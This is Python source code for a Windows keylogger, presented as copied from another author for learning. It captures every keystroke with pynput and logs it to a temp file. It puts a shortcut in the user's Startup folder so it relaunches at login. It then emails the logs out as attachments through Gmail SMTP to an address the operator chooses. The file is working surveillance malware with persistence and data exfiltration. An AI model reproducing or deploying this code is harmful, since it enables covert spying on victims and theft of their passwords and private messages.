"""
I took this keylogger from internet (developed by Edinson Requena)to learn from some libraries like os, pynput and email.
This keylogger send the information every 50 letters via e-mail.
"""
from pynput.keyboard import Key, Listener
import os, shutil, datetime, winshell, tempfile, smtplib
from win32com.client import Dispatch
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading, socket

save = tempfile.mkdtemp("temp_file")
print(save)
cwd = os.getcwd()
print(cwd)
source = os.listdir()
print(source)

dateAndtime = datetime.datetime.now().strftime("-%Y-%m-%d-%H-%M-%S")

filename = save+"\key_log"+dateAndtime+".txt"
open(filename,"w+")
keys=[]
count = 0
countInternet = 0
word = "Key."
username = os.getlogin()
destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)

def _dir():
    path = os.path.join(destination, "keylogger.pyw - Shortcut.lnk")
    target = r""+cwd+"\keylogger.pyw"
    icon = r""+cwd+"\keylogger.pyw"
    for files in source:
        if files == "keylogger.pyw":
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(path)
            shortcut.Targetpath = target
            shortcut.IconLocation = icon
            shortcut.save()

email = None
password = None
gmail = None

def intro_data():
    global gmail, password, email

    gmail = input("Put here the gmail account that will send you the emails: ")
    password = input("enter the gmail account password: ")
    email = input("Put her the gmail account that receives the emails: ")

shortcut = 'keylogger.pyw - Shortcut.lnk'
if shortcut in destination:
    pass
else:
    _dir()

def is_connected(): #verifyng connection to Internet
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False

def _validation(): #veryfing inputs, if some of them are diferents to zero, will return false
    global gmail, password, email

    return len(gmail) != 0 and len(password) != 0 and len(email) != 0


def field_inputs():
    if _validation():
        send_email()
    else:
        print("Error")

def send_email(): #this function basically send and email
    global gmail, password, email

    msg = MIMEMultipart()
    msg['From'] = gmail
    msg['To'] = email
    msg['Subject'] = "Don't be evil"
    body = "This keylogger was created by Edinson Requena."

    msg.attach(MIMEText(body, 'plain'))
    attachment = open(filename, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(gmail, password)
    text = msg.as_string()
    server.sendmail(gmail, email, text)
    server.quit()

def write_file(keys):
    with open(filename,"a") as f:
        for key in keys:
            if key == 'Key.enter': # escribe una nueva línea.
                f.write("\n")
            elif key == 'Key.space':
                f.write(key.replace("Key.space"," ")) # ingresa un espacio
            elif key == 'Key.backspace':
                f.write(key.replace("Key.backspace","$")) # ingresará un $
            elif key[:4] == word:# para otros caracteres que no tuve en cuenta para hacer mas practico el tutorial
                pass
            else:  # reenvia palabras que escribimos en el archivo.
                f.write(key.replace("'",""))
            # Recuerda que todo esto es modificable, investigando un poco mas a fondo podrias hacer de tu mensaje uno mucho mas legible,
            # aunque este ya lo es

def on_press(key):
    global keys, count, countInternet, filename
    keys.append(str(key))

    if len(keys) > 10:
        write_file(keys)
        print(keys)
        if is_connected():
            count += 1
            print('connected {}'.format(count))
            if count > 100:

                count = 0
                t1 = threading.Thread(target=send_email, name='t1')
                t1.start()

        else:
            countInternet += 1
            print('not connected',countInternet)
            if countInternet > 10:
                countInternet = 0
                filename = filename.strip(save)
                for files in save:
                    if files == filename:
                        shutil.copy(files+"t",source)
        keys.clear()

if __name__ == '__main__':
    print("*"*20 ,"WELCOME, DO NOT SPY YOUR COUPLE", "*"*20)
    print("Write the first letter of the options to choose one.")
    print("[I]ntroduce data")
    print("[H]elp")
    print("\n\n")
    print("*This keylogger was created by Edinson Requena. Feel free to modify, download or copy it. use it for good <3*")
    print("\n")
    print("requenasoftware@gmail.com")

    command = input()
    command = command.upper()

    if command == "I":
        intro_data()
    elif command == "H":
        pass

    with Listener(on_press=on_press) as listener:
       listener.join()